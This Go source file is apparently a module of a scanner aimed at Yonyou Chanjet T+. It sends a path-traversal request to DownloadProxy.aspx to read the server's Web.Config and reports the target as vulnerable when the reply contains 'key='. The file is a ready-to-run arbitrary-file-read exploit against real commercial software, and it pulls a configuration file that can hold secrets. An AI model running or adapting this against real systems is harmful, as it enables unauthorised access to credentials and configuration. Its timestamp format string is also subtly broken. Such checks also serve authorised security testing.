package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func DownloadProxyScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	DownloadProxy := "用友 畅捷通T+ DownloadProxy任意文件读取漏洞"
	urls := address + "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
	response, _ := client.Get(urls)
	defer response.Body.Close()
	body, _ := ioutil.ReadAll(response.Body)
	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "key=") {
		result := DownloadProxy + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename) // 保存结果到文本文件
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, DownloadProxy, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, DownloadProxy)
		fmt.Println(output)
	}
}
